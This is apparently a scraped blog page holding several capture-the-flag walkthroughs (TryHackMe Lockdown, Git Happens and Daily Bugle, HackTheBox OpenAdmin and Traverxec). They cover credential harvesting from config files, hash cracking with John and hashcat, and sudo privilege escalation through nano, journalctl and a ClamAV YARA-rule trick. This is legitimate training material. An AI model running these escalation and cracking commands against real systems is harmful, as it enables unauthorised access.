if(@getimagesize(base_url.$file)){ return base_url.$file; }else{ return base_url.\u0026#39;dist/img/no-image-available.png\u0026#39;; } }else{ return base_url.\u0026#39;dist/img/no-image-available.png\u0026#39;; } Cracked it but was not useful since I couldn\u0026rsquo;t switch to any of the two users.\nOn further enumeration, /classes directory a file called DBConnection.php had a username \u0026amp; password for accesing mysql database .\nwww-data@lockdown:/var/www/html/classes$ ls -al ls -al total 52 drwxr-xr-x 2 www-data www-data 4096 May 11 2021 . drwxr-xr-x 11 www-data www-data 4096 May 11 2021 .. -rw-r--r-- 1 www-data www-data 1770 May 11 2021 City.php -rw-r--r-- 1 www-data www-data 653 May 11 2021 DBConnection.php -rw-r--r-- 1 www-data www-data 2811 May 11 2021 Establishment.php -rw-r--r-- 1 www-data www-data 1880 May 11 2021 Login.php -rw-r--r-- 1 www-data www-data 1011 May 11 2021 Main.php -rw-r--r-- 1 www-data www-data 2991 May 11 2021 People.php -rw-r--r-- 1 www-data www-data 1788 May 11 2021 State.php -rw-r--r-- 1 www-data www-data 3606 May 11 2021 SystemSettings.php -rw-r--r-- 1 www-data www-data 4 May 11 2021 TEST.php -rw-r--r-- 1 www-data www-data 2145 May 11 2021 Users.php -rw-r--r-- 1 www-data www-data 1800 May 11 2021 Zone.php www-data@lockdown:/var/www/html/classes$ cat DBConnection.php cat DBConnection.php \u0026lt;?php class DBConnection{ private $host = \u0026#39;localhost\u0026#39;; private $username = \u0026#39;cts\u0026#39;; private $password = \u0026#39;YOUMKtIXoR********9tvq2UdNWE\u0026#39;; private $database = \u0026#39;cts_db\u0026#39;; public $conn; public function __construct(){ if (!isset($this-\u0026gt;conn)) { $this-\u0026gt;conn = new mysqli($this-\u0026gt;host, $this-\u0026gt;username, $this-\u0026gt;password, $this-\u0026gt;database); if (!$this-\u0026gt;conn) { echo \u0026#39;Cannot connect to database server\u0026#39;; exit; } } } public function __destruct(){ $this-\u0026gt;conn-\u0026gt;close(); } Logging into cts_db database to retreive some juicy info .\nwww-data@lockdown:/var/www/html/classes$ mysql -h localhost -u cts -pYOUMKt**********9tvq2UdNWE -D cts_db mysql: [Warning] Using a password on the command line interface can be insecure. Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Welcome to the MySQL monitor. Commands end with ; or \\g. Your MySQL connection id is 212 Server version: 5.7.35-0ubuntu0.18.04.1 (Ubuntu) Copyright (c) 2000, 2021, Oracle and/or its affiliates. Oracle is a registered trademark of Oracle Corporation and/or its affiliates. Other names may be trademarks of their respective owners. Type \u0026#39;help;\u0026#39; or \u0026#39;\\h\u0026#39; for help. Type \u0026#39;\\c\u0026#39; to clear the current input statement. mysql\u0026gt; mysql\u0026gt; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | cts_db | +--------------------+ 2 rows in set (0.00 sec) mysql\u0026gt; use cts_db; Database changed mysql\u0026gt; show tables; +------------------+ | Tables_in_cts_db | +------------------+ | barangay_list | | city_list | | establishment | | people | | state_list | | system_info | | tracks | | users | +------------------+ 8 rows in set (0.00 sec) mysql\u0026gt; SELECT * FROM users; +----+--------------+----------+----------+----------------------------------+-------------------------------+------------+---------------------+---------------------+ | id | firstname | lastname | username | password | avatar | last_login | date_added | date_updated | +----+--------------+----------+----------+----------------------------------+-------------------------------+------------+---------------------+---------------------+ | 1 | Adminstrator | Admin | admin | 3eba6f73c19818c36ba8fea761a3ce6d | uploads/1614302940_avatar.jpg | NULL | 2021-01-20 14:02:37 | 2021-02-26 10:23:23 | +----+--------------+----------+----------+----------------------------------+-------------------------------+------------+---------------------+---------------------+ 1 row in set (0.00 sec) I cracked the password hash using crackstation.net .\nNow we have the password .Lets switch to cyrus user.\nuser.txt üö© Grab the user.txt flag !\ncyrus@lockdown:~$ cat user.txt cat user.txt THM{w4c1F5Au********Zyp0QJDIbWS} root.txt üö© To get a stable shell , I uploaded my id_rsa.pub key to authorized_keys so that I could SSH into the machine directly .\nThe home directory contained the following -\nA directory called quarentine which had nothing in it. A file called testvirus sudo -l reveals that the user cyrus could run /opt/scan/scan.sh as root !\ncyrus@lockdown:~$ sudo -l [sudo] password for cyrus: Sorry, try again. [sudo] password for cyrus: Matching Defaults entries for cyrus on lockdown: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User cyrus may run the following commands on lockdown: (root) /opt/scan/scan.sh cyrus@lockdown:~$ cat /opt/scan/scan.sh #!/bin/bash read -p \u0026#34;Enter path: \u0026#34; TARGET if [[ -e \u0026#34;$TARGET\u0026#34; \u0026amp;\u0026amp; -r \u0026#34;$TARGET\u0026#34; ]] then /usr/bin/clamscan \u0026#34;$TARGET\u0026#34; --copy=/home/cyrus/quarantine /bin/chown -R cyrus:cyrus /home/cyrus/quarantine else echo \u0026#34;Invalid or inaccessible path.\u0026#34; fi The script is executing a binary called clamscan .Time to google what it is.\nClam AntiVirus (ClamAV) is a free software, cross-platform and open-source antivirus software toolkit able to detect many types of malicious software, including viruses.\nSo what the script does is it asks us for a path to a file \u0026amp; then it scans it using clamscan (anti-virus) and if the file is malicious ,it copies the file to ~/quarentine directory.\nWe had a testvirus file remember? Lets give it as i/p to this script.\ncyrus@lockdown:/var/lib/clamav$ sudo /opt/scan/scan.sh Enter path: /home/cyrus/testvirus /home/cyrus/testvirus: EICAR_MD5.UNOFFICIAL FOUND /home/cyrus/testvirus: copied to \u0026#39;/home/cyrus/quarantine/testvirus\u0026#39; ----------- SCAN SUMMARY ----------- Known viruses: 1 Engine version: 0.103.2 Scanned directories: 0 Scanned files: 1 Infected files: 1 Data scanned: 0.00 MB Data read: 0.00 MB (ratio 0.00:1) Time: 0.011 sec (0 m 0 s) Start Date: 2021:11:29 11:47:30 End Date: 2021:11:29 11:47:30 Since the file contained certain signatures which were declared as malicious in the clamscan database ,it identified the file as a virus and then sent it to ~/quarentine directory.\nThe database file which identifies virus is located at /var/lib/clamav/main.hdb which contained - 69630e4574ec6798239b091cda43dca0:69:EICAR_MD5 \u0026amp; so it flagged the testvirus file as malicious one.\nAfter hours of googling , I found out a way to create Yara signature rule of our own to flag a malicious file .\nClamAV can process YARA rules. ClamAV virus database file names ending with .yar or .yara are parsed as YARA rule files\nHow to create rule -\nhttps://docs.clamav.net/manual/Signatures/YaraRules.html https://yara.readthedocs.io/en/stable/writingrules.html So I created a custom signature rule called rule.yara with the below code \u0026amp; saved it in /var/lib/clamav .\nrule root { strings: $s = \u0026#34;THM{\u0026#34; condition: $s } This will flag a file which contains string like THM{ and flags it as a virus ,as a result the file gets stored in ~/quarentine directory.\ncyrus@lockdown:/var/lib/clamav$ sudo /opt/scan/scan.sh Enter path: /root/root.txt /root/root.txt: YARA.root.UNOFFICIAL FOUND /root/root.txt: copied to \u0026#39;/home/cyrus/quarantine/root.txt\u0026#39; ----------- SCAN SUMMARY ----------- Known viruses: 2 Engine version: 0.103.2 Scanned directories: 0 Scanned files: 1 Infected files: 1 Data scanned: 0.00 MB Data read: 0.00 MB (ratio 0.00:1) Time: 0.006 sec (0 m 0 s) Start Date: 2021:11:29 12:21:13 End Date: 2021:11:29 12:21:13 Success , Grab the root.txt flag !\ncyrus@lockdown:/var/lib/clamav$ cat ~/quarantine/root.txt THM{IQ23Em4V**********W9GZZJxm} ","permalink":"https://sh3bu.github.io/themes/hugo-PaperMod/posts/lockdown/","summary":"Description Stay at 127.0.0.1. Wear a 255.255.255.0\nRoom name Lockdown OS Linux Difficulty Medium Room Link https://tryhackme.com/room/lockdown Creator hangrymoose Enumeration Portscan ‚ûú lockdown nmap -sC -sV 10.10.252.58 -v -oN lockdown.nmap # Nmap 7.91 scan initiated Mon Nov 8 03:56:11 2021 as: nmap -sV -sC -v -oN lockdown.nmap 10.10.252.58 Nmap scan report for 10.10.252.58 Host is up (0.35s latency). Not shown: 998 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.","title":"Lockdown - THM"},{"content":"Room Description - Boss wanted me to create a prototype, so here it is! We even used something called \u0026ldquo;version control\u0026rdquo; that made deploying this really easy!\nRoom Link - https://tryhackme.com/room/githappens\nCreator - hydragyrum\nTask 1 - Find the Super Secret Password NMAP\n# Nmap 7.91 scan initiated Wed Jul 21 01:43:34 2021 as: nmap -sC -sV -v -p 80 -Pn -oN git-happens.nmap 10.10.73.189 Nmap scan report for 10.10.73.189 Host is up. PORT STATE SERVICE VERSION 80/tcp filtered http Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Jul 21 01:43:37 2021 -- 1 IP address (1 host up) scanned in 3.18 seconds As you can see there is only one port open :\nPort 80 - HTTP\nWeb Enumeration\nWe get a static login page as below üëáüèª\nThere is nothing much here , let\u0026rsquo;s do some directory busting .\nffuf -c -t 100 -w /usr/share/wordlists/dirb/common.txt -u http://git-happens.thm/FUZZ\nWe get the following directories\n.git/HEAD css index.html The .git directory is what interests me since this box is related to git .\nLets take a look at that directory\nCool ! Let\u0026rsquo;s download all of them using a tool called gitdumper which is a part of GitTools repo. Link - https://github.com/internetwache/GitTools\nRunnning the help command on gitdumper.sh tells us the syntax which we need to use to run the tool .\nAs the tool says lets create a directory to download all the files. I made a directory called git and ran the script along with the URL of the website.\n/opt/tools/GitTools/Dumper/gitdumper.sh http://git-happens.thm/.git/ git ‚îå‚îÄ‚îÄ(shebu„âøkali)-[~/Desktop/thm/git-happens] ‚îî‚îÄ$ /opt/tools/GitTools/Dumper/gitdumper.sh http://git-happens.thm/.git/ git 127 ‚®Ø ########### # GitDumper is part of https://github.com/internetwache/GitTools # # Developed and maintained by @gehaxelt from @internetwache # # Use at your own risk. Usage might be illegal in certain circumstances. # Only for educational purposes! ########### [*] Destination folder does not exist [+] Creating git/.git/ [+] Downloaded: HEAD [-] Downloaded: objects/info/packs [+] Downloaded: description [+] Downloaded: config [-] Downloaded: COMMIT_EDITMSG [+] Downloaded: index [+] Downloaded: packed-refs [+] Downloaded: refs/heads/master [-] Downloaded: refs/remotes/origin/HEAD [-] Downloaded: refs/stash [+] Downloaded: logs/HEAD [+] Downloaded: logs/refs/heads/master [-] Downloaded: logs/refs/remotes/origin/HEAD [-] Downloaded: info/refs [+] Downloaded: info/exclude [-] Downloaded: /refs/wip/index/refs/heads/master [-] Downloaded: /refs/wip/wtree/refs/heads/master [+] Downloaded: objects/d0/b3578a628889f38c0affb1b75457146a4678e5 [-] Downloaded: objects/00/00000000000000000000000000000000000000 [+] Downloaded: objects/b8/6ab47bacf3550a5450b0eb324e36ce46ba73f1 [+] Downloaded: objects/77/aab78e2624ec9400f9ed3f43a6f0c942eeb82d [+] Downloaded: objects/f1/4bcee8053e39eeb414053db4ec7b985f65edc8 [+] Downloaded: objects/9d/74a92581071ae7c4a470ff035e0de4598877e5 [+] Downloaded: objects/20/9515b2f7cbdfb731d275c4b089e41ba35c3bc8 [+] Downloaded: objects/5a/35c9b7c787c22f689d0364cf57b013a11561a2 [+] Downloaded: objects/08/906612dfe6821cebc21794eb85601fc4f54de9 [+] Downloaded: objects/4a/2aab268541cbcc434e0565b4f4f2deca29ee5f [+] Downloaded: objects/7c/578d86a8713b67af2cb1b1d7c524c23cefe7aa [+] Downloaded: objects/4e/7178fa5b68fec15e54f2b79ace6f9ce0169e01 [+] Downloaded: objects/2e/b93ac3534155069a8ef59cb25b9c1971d5d199 [+] Downloaded: objects/4c/f757268c6824041664d132a29908aa9c362a26 [+] Downloaded: objects/3a/39b02d3b9d12222bac4737ee67e31403d62f13 [+] Downloaded: objects/ae/f68b1e25df81a8c96ee4d57b20cc9f7a1ebee5 [+] Downloaded: objects/d6/df4000639981d032f628af2b4d03b8eff31213 [+] Downloaded: objects/56/820adbbd5ac0f66f61916122c94ea52937e9b2 [+] Downloaded: objects/d9/54a99b96ff11c37a558a5d93ce52d0f3702a7d [+] Downloaded: objects/06/012255f074d7bc4acc6fadbcff004380b5f83b [+] Downloaded: objects/bc/8054d9d95854d278359a432b6d97c27e24061d [+] Downloaded: objects/dd/13038df878d41b774ce4fd4552091d46873c25 [+] Downloaded: objects/8c/94b154aef92380e29a3f16f1a889b56127cf13 [+] Downloaded: objects/e5/6eaa8e29b589976f33d76bc58a0c4dfb9315b1 [+] Downloaded: objects/48/926fdeb371c8ba174b1669d102e8c873afabf1 [+] Downloaded: objects/ce/b8d530ebcf79806dffc981905ec8c2e0d7a65b [+] Downloaded: objects/87/bcbcb476578c6cc90ed39f9404292539fe1c9c [+] Downloaded: objects/39/5e087334d613d5e423cdf8f7be27196a360459 [-] Downloaded: objects/40/04c23a71fd6ba9b03ec9cb7eed08471197d843 [-] Downloaded: objects/19/a865c5442a9d6a7c7cbea070f3cb6aa5106ef8 [-] Downloaded: objects/0f/679a88dbbaf89ff64cb351a151a5f29819a3c0 [+] Downloaded: objects/0e/abcfcd62467d64fb30b889e8de5886e028c3ed [+] Downloaded: objects/ba/5e4a76e3f7b6c49850c41716f8f1091fbdc84e [+] Downloaded: objects/2f/423697bf81fe5956684f66fb6fc6596a1903cc [+] Downloaded: objects/e3/8d9df9b13e6499b749e36e064ec30f2fa45657 [+] Downloaded: objects/0e/0de07611ada4690fc0ea5b5c04721ba6f3fd0d [+] Downloaded: objects/66/64f4e548df7591da3728d7662b6376debfce8d Once its done , let\u0026rsquo;s check it out using git commands.\ngit status So these were the files which were not committed yet .Lets enumerate further and see whether we get any other information\ngit log Running git log command gives us these results\n‚îå‚îÄ‚îÄ(shebu„âøkali)-[~/Desktop/thm/git-happens/git] ‚îî‚îÄ$ git log commit d0b3578a628889f38c0affb1b75457146a4678e5 (HEAD -\u0026gt; master, tag: v1.0) Author: Adam Bertrand \u0026lt;hydragyrum@gmail.com\u0026gt; Date: Thu Jul 23 22:22:16 2020 +0000 Update .gitlab-ci.yml commit 77aab78e2624ec9400f9ed3f43a6f0c942eeb82d Author: Hydragyrum \u0026lt;hydragyrum@gmail.com\u0026gt; Date: Fri Jul 24 00:21:25 2020 +0200 add gitlab-ci config to build docker file. commit 2eb93ac3534155069a8ef59cb25b9c1971d5d199 Author: Hydragyrum \u0026lt;hydragyrum@gmail.com\u0026gt; Date: Fri Jul 24 00:08:38 2020 +0200 setup dockerfile and setup defaults. commit d6df4000639981d032f628af2b4d03b8eff31213 Author: Hydragyrum \u0026lt;hydragyrum@gmail.com\u0026gt; Date: Thu Jul 23 23:42:30 2020 +0200 Make sure the css is standard-ish! commit d954a99b96ff11c37a558a5d93ce52d0f3702a7d Author: Hydragyrum \u0026lt;hydragyrum@gmail.com\u0026gt; Date: Thu Jul 23 23:41:12 2020 +0200 re-obfuscating the code to be really secure! commit bc8054d9d95854d278359a432b6d97c27e24061d Author: Hydragyrum \u0026lt;hydragyrum@gmail.com\u0026gt; Date: Thu Jul 23 23:37:32 2020 +0200 Security says obfuscation isn\u0026#39;t enough. They want me to use something called \u0026#39;SHA-512\u0026#39; commit e56eaa8e29b589976f33d76bc58a0c4dfb9315b1 Author: Hydragyrum \u0026lt;hydragyrum@gmail.com\u0026gt; Date: Thu Jul 23 23:25:52 2020 +0200 Obfuscated the source code. Hopefully security will be happy! commit 395e087334d613d5e423cdf8f7be27196a360459 Author: Hydragyrum \u0026lt;hydragyrum@gmail.com\u0026gt; Date: Thu Jul 23 23:17:43 2020 +0200 Made the login page, boss! commit 2f423697bf81fe5956684f66fb6fc6596a1903cc Author: Adam Bertrand \u0026lt;hydragyrum@gmail.com\u0026gt; Date: Mon Jul 20 20:46:28 2020 +0000 Initial commit (END) If you go through the comments of all the commits , one of the comments seem quite interesting .\nSeems like its the source code of the login page we saw earlier !\nLets view what changes were made during that commit -\ngit show 395e087334d613d5e423cdf8f7be27196a360459 After scrolling through the source code, we find this piece of code where there is an insecure login function which contains the username \u0026amp; password of admin üòÇ\nGrab the Super Secret Password üö© and submit it ! Yes it\u0026rsquo;s the flag which you want ‚úî\n","permalink":"https://sh3bu.github.io/themes/hugo-PaperMod/posts/githappens/","summary":"Room Description - Boss wanted me to create a prototype, so here it is! We even used something called \u0026ldquo;version control\u0026rdquo; that made deploying this really easy!\nRoom Link - https://tryhackme.com/room/githappens\nCreator - hydragyrum\nTask 1 - Find the Super Secret Password NMAP\n# Nmap 7.91 scan initiated Wed Jul 21 01:43:34 2021 as: nmap -sC -sV -v -p 80 -Pn -oN git-happens.nmap 10.10.73.189 Nmap scan report for 10.10.73.189 Host is up.","title":"Git Happens - THM"},{"content":"Summary - OpenAdmin from HackTheBox is an easy-rated machine which involves an exploit for OpenNetAdmin to get a foothold on the machine. There are 2 users on the box Jimmy and Joanna . We get the password for Jimmy via database config file \u0026amp; then ssh as Jimmy, then on enumerating we find an internal application running.Doing a simple curl command reveals id_rsa key of Joanna. We then crack the password of the id_rsa file and ssh into the machine as Joanna. For root, we find that we have sudo privileges over nano . We refer sudo entry for nano on gtfobins \u0026amp; we easily escalate our privileges as root!\nName - Openadmin OS - Linux Difficulty - Easy Room Link - https://www.hackthebox.eu/home/machines/profile/222 Creator - del_KZx497Ju Enumeration - Nmap\n# Nmap 7.91 scan initiated Tue Jul 6 14:02:13 2021 as: nmap -sC -sV -p 22,80 -v -oN openadmin.nmap 10.10.10.171 Nmap scan report for 10.10.10.171 Host is up (0.46s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA) | 256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cfüá©üá™bd:6c:7a:54 (ECDSA) |_ 256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-methods: |_ Supported Methods: HEAD GET POST OPTIONS |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Jul 6 14:02:42 2021 -- 1 IP address (1 host up) scanned in 28.86 seconds As you can see there are 2 ports open :\nPort 22 - SSH - OpenSSH 7.6p1 Ubuntu 4ubuntu0.3\nPort 80 - HTTP - Apache httpd 2.4.29\nWeb Enumeration\nAt port 80 we find default page of apache\nLets do some directory bruteforcing. Dirsearch reveals the following directories\n/music /artwork /sierra On visiting the /music directory It gives us this page This login button takes us to http://openadmin.htb/ona .On visiting,we get a page like this\nFrom the above , we could identify that the software is OpenNetAdmin and the version is v18.1.1\nFoothold - We use searchsploit to find any publicly available exploits for OpenNetAdmin - v18.1.1 ,\u0026amp; we find this\nLets mirror it to our current directory\nLets run the exploit\nAnd we are www-data user\nThere are 2 users on the machine Jimmy and Joanna\ncat /etc/passwd | grep -i \u0026#34;bash\u0026#34; Shell as Jimmy - On enumerating the current directory we find a database config file which contains a password !\ncat local/config/database_settings.inc.php | grep -i \u0026#34;pass\u0026#34; We are not sure which user\u0026rsquo;s password is this , so first we try to ssh into the machine as Jimmy \u0026amp; we\u0026rsquo;re logged in !\nRunning id command we see that we are part of internal group .Lets keep that in mind and move ahead \u0026amp; enumerate further .. We run a find command to check for files which jimmy owns\nfind / -user jimmy 2\u0026gt;/dev/null HMM..INTERESTING ! Lets check that /var/www/internal/ directory\nSeems like there is an internal website running here üßê .We can verify it by running\nnetstat -tulpn Shell as Joanna - Lets check that internal website running at port 52486 by using curl command\ncurl localhost:52846/main.php Voila we get an encrypted id_rsa key !! Lets crack it and ssh in as *Joanna *!\nRun ssh2john against id_rsa file to obtain a hash and crack it using John -\n/usr/share/john/ssh2john.py --wordlist=/usr/share/wordlists/rockyou.txt id_rsa \u0026gt;\u0026gt; hash john --wordlists=/usr/share/wordlists/rockyou.txt hash We get Joanna\u0026rsquo;s password !Lets try ssh into the box as Joanna\nGrab the user.txtüö©\nShell as Root - Running sudo -l we find we could run nano on /opt/priv directory\nSo we check GTFOBINS for any sudo entry for nano\nsudo /bin/nano /opt/priv ^R^X reset; sh 1\u0026gt;\u0026amp;0 2\u0026gt;\u0026amp;0 Run the above commands to get a root shell Grab the root.txt üö© üòé\n","permalink":"https://sh3bu.github.io/themes/hugo-PaperMod/posts/openadmin/","summary":"Summary - OpenAdmin from HackTheBox is an easy-rated machine which involves an exploit for OpenNetAdmin to get a foothold on the machine. There are 2 users on the box Jimmy and Joanna . We get the password for Jimmy via database config file \u0026amp; then ssh as Jimmy, then on enumerating we find an internal application running.Doing a simple curl command reveals id_rsa key of Joanna. We then crack the password of the id_rsa file and ssh into the machine as Joanna.","title":"Openadmin - HTB"},{"content":"Summary - Traverxec is a easy rated machine from hackthebox which involves a public exploit for nostromo web server by which we gain a foothold on the box . On the machine there\u0026rsquo;s a user called david .We find an id_rsa key of David in one of the directories \u0026amp; thus escalating our privileges to David. For root, we make use of a sudo misconfiguration on journelctl binary to escalate our privileges to root !\nName - Traverxec OS - Linux Difficulty - Easy Room Link - https://www.hackthebox.eu/home/machines/profile/217 Creator - jkr Enumeration - Nmap\n# Nmap 7.91 scan initiated Thu Jul 15 13:18:21 2021 as: nmap -sC -sV -v -p 22,80 -oN traverxec.nmap 10.10.10.165 Nmap scan report for 10.10.10.165 Host is up (0.38s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0) | ssh-hostkey: | 2048 aa:99:a8:16:68üíø41:cc:f9:6c:84:01:c7:59:09:5c (RSA) | 256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA) |_ 256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519) 80/tcp open http nostromo 1.9.6 |_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34 | http-methods: |_ Supported Methods: GET HEAD POST |_http-server-header: nostromo 1.9.6 |_http-title: TRAVERXEC Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Jul 15 13:18:39 2021 -- 1 IP address (1 host up) scanned in 18.13 seconds As you can see there are 2 ports open :\nPort 22 - SSH - OpenSSH 7.9p1 Debian 10+deb10u1 Port 80 - HTTP - nostromo 1.9.6\nWebsite - Port 80\nAs the nmap scan showed ,the website isrunning on nostromo web server of version 1.9.6 , lets look for public exploits for this version using searchsploit .\nAnd we have a remote code execution vulnerability for this version of nostromo. I had some issues with python2 when solving the box so I had to use metasploit this time.\nOpen msfconsole and search for nostromo \u0026amp; you will get this exploit .\nFoothold - Lets use the metasploit module . Set the LHOST,RHOST,RPORT \u0026amp; other parameters needed for the exploit to work and finally run the exploit .\nAnd we are in as www-data user !\nViewing /etc/passwd tells us there is a user called David\ncat /etc/passwd |grep -i \u0026#34;bash\u0026#34; Shell as David - I ran Linpeas to check for any interesting files or any priv-esc vectors , it displayed an md5crypt password hash of David\nI used hashcat to crack it\nhashcat -m 500 htpasswd /usr/share/wordlists/rockyou.txt --username --force Now we have this - david:Nowonly4me .\nBut this password doesn\u0026rsquo;t seem to help as I couldn\u0026rsquo;t ssh into the machine as David.\nTime for some manual enumeration!\nLets look for any files from nostromo web server ,\nIn /var , we see a directory called nostromo .Lets enumerate that directory as it might contain some juicy information.\nLooking at /var/nostromo/conf/.htpasswd - we have that hash which linpeas found for us .\nIn the /var/nostromo/conf/nhttpd.conf we have these contents which seems interesting!\nAfter reading the documentation of nostromo , I came to know that homedirs serve as the home directories of the user.\nSo under david\u0026rsquo;s home directory we have a public directory called public_www.Lets lists the contents of this directory\nWe find that there is another directory within it called protected-file-area.Lets list the contents of that directory now ,\nWe have 2 files .htaccess \u0026amp; backup-ssh-identity-files.tgz .The tar file seems interesting .Lets copy it to /dev/shm and lets extract the contents of the tar archive.\nWe can see we have id_rsa key from the extracted files,lets copy that to our machine .\nIt is encrypted hence we will use ssh2john to extract a hash of it and then crack it using rockyou wordlist !\nssh2john id_rsa \u0026gt; hash john --wordlist=/usr/share/wordlists/rockyou.txt hash And we have the password .Make sure to give correct permissions to id_rsa \u0026amp; now lets SSH into the machine as David\nGrab the user.txt üö©\nShell as Root - Running Linpeas ,we find that we have a shell script called server-status.sh\nI checked if there are any cronjobs running which executes this script \u0026amp; there wasn\u0026rsquo;t any. I even used pspy to check for any cronjobs run by root which were not visible to us. And still we find nothing .\nOK .lets check the contents of the file .\n#!/bin/bash cat /home/david/bin/server-stats.head echo \u0026#34;Load: `/usr/bin/uptime`\u0026#34; echo \u0026#34; \u0026#34; echo \u0026#34;Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`\u0026#34; echo \u0026#34;Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`\u0026#34; echo \u0026#34; \u0026#34; echo \u0026#34;Last 5 journal log lines:\u0026#34; /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat The last line seems weird . Journelctl is run with sudo .\nJournalctl is a utility for querying and displaying logs from journald, systemd\u0026rsquo;s logging service. Since journald stores log data in a binary format instead of a plaintext format, journalctl is the standard way of reading log messages processed by journald\nBut the key thing here is the sudo rule breaks when a pipe command is introduced.Meaning that **any command after pipe will not be executed with sudo permissions ! **'\nSo in the last line only /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service is executed with sudo permissions and not /usr/bin/cat .\nLets check GTFOBINS for any sudo misconfiguration in journelctl to escalate our privileges.\nSteps - Run the command\n/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service Type !/bin/sh \u0026amp; hit ENTER .\nWOHOO ! We are root !\nGrab the root.txt üö©\n","permalink":"https://sh3bu.github.io/themes/hugo-PaperMod/posts/traverxec/","summary":"Summary - Traverxec is a easy rated machine from hackthebox which involves a public exploit for nostromo web server by which we gain a foothold on the box . On the machine there\u0026rsquo;s a user called david .We find an id_rsa key of David in one of the directories \u0026amp; thus escalating our privileges to David. For root, we make use of a sudo misconfiguration on journelctl binary to escalate our privileges to root !","title":"Traverxec - HTB"},{"content":"Description - Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges by taking advantage of yum . Hack into the machine and obtain the root user\u0026rsquo;s credentials.\n**Room name ** Daily Bugle **OS ** Linux **Difficulty ** Hard **Room Link ** https://tryhackme.com/room/dailybugle **Creator ** Tryhackme Enumeration - Portscan ‚ûú dailybugle rustscan -a 10.10.164.206 --range 0-65535 -- -sV -sC -v -oN dailybugle.nmap # Nmap 7.91 scan initiated Sun Sep 5 10:04:00 2021 as: nmap -vvv -p 22,80,3306 -sV -sC -v -oN dailybugle.nmap 10.10.164.206 Nmap scan report for 10.10.164.206 Host is up, received syn-ack (0.65s latency). Scanned at 2021-09-05 10:04:01 EDT for 23s PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCbp89KqmXj7Xx84uhisjiT7pGPYepXVTr4MnPu1P4fnlWzevm6BjeQgDBnoRVhddsjHhI1k+xdnahjcv6kykfT3mSeljfy+jRc+2ejMB95oK2AGycavgOfF4FLPYtd5J97WqRmu2ZC2sQUvbGMUsrNaKLAVdWRIqO5OO07WIGtr3c2ZsM417TTcTsSh1Cjhx3F+gbgi0BbBAN3sQqySa91AFruPA+m0R9JnDX5rzXmhWwzAM1Y8R72c4XKXRXdQT9szyyEiEwaXyT0p6XiaaDyxT2WMXTZEBSUKOHUQiUhX7JjBaeVvuX4ITG+W8zpZ6uXUrUySytuzMXlPyfMBy8B | 256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKb+wNoVp40Na4/Ycep7p++QQiOmDvP550H86ivDdM/7XF9mqOfdhWK0rrvkwq9EDZqibDZr3vL8MtwuMVV5Src= | 256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP4TcvlwCGpiawPyNCkuXTK5CCpat+Bv8LycyNdiTJHX 80/tcp open http syn-ack Apache httpd 2.4.6 ((CentOS) PHP/5.6.40) |_http-favicon: Unknown favicon MD5: 1194D7D32448E1F90741A97B42AF91FA |_http-generator: Joomla! - Open Source Content Management | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS | http-robots.txt: 15 disallowed entries | /joomla/administrator/ /administrator/ /bin/ /cache/ | /cli/ /components/ /includes/ /installation/ /language/ |_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/ |_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40 |_http-title: Home 3306/tcp open mysql syn-ack MariaDB (unauthorized) Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun Sep 5 10:04:25 2021 -- 1 IP address (1 host up) scanned in 24.88 seconds There are 3 ports open :\nPort 22 - SSH - OpenSSH 7.4\nPort 80 - http - Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)\n**Port 3306 ** - mysql - MariaDB (unauthorized)\nWeb enumeration On visiting the webpage on port 80 , we get this\nTask 1 : Access the web server, who robbed the bank?\nAnswer - spiderman\nrobots.txt As per the nmap scan , there were few disallowed entries listed in robots.txt 